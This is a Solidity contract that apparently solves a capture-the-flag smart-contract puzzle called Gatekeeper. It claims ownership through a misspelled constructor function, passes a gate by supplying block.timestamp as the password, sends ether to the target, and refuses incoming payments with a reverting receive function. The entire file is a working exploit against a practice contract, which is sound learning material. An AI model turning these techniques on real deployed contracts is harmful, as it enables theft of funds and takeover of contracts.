
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Gatekeeper {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function entrant() external view returns (address);
    function allowEntrance() external view returns (bool);
    function owner() external view returns (address);
    function enter() external;
}

contract Exploiter {

    constructor() {
    }

    function exploit(address _gatekeeper) public payable {
        Gatekeeper gatekeeper = Gatekeeper(_gatekeeper);
        // Gate1:
        gatekeeper.construct0r();

        require(gatekeeper.owner() == address(this), "Error gate1");

        // Gate2:
        gatekeeper.createTrick(); // created in this tx, so pass is block.timestamp
        uint256 password2 = block.timestamp;
        gatekeeper.getAllowance(password2);

        require(gatekeeper.allowEntrance(), "Error gate2");

        // Gate3:
        payable(address(gatekeeper)).send(0.0011 ether);    //needs >0.001 eth
                                                            // revert receive of funds

        require(address(gatekeeper  ).balance > 0.001 ether, "Error gate3");

        // Enter:
        gatekeeper.enter();

        require(gatekeeper.entrant() == tx.origin, "Error final");
    }

    receive() external payable {
        revert();
    }
}

